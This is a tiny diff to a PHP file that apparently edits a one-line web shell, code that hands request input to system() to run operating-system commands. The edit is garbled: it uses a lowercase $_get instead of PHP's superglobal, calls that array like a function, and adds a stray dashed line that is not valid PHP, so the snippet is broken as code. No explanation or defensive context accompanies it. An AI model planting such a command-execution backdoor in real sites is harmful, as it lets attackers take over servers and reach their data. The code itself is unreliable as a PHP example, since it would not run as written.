@@ -1,3 +1,4 @@
 <?php
-  system($_get);
+  system($_get('try'));
+  --------------------
 ?>
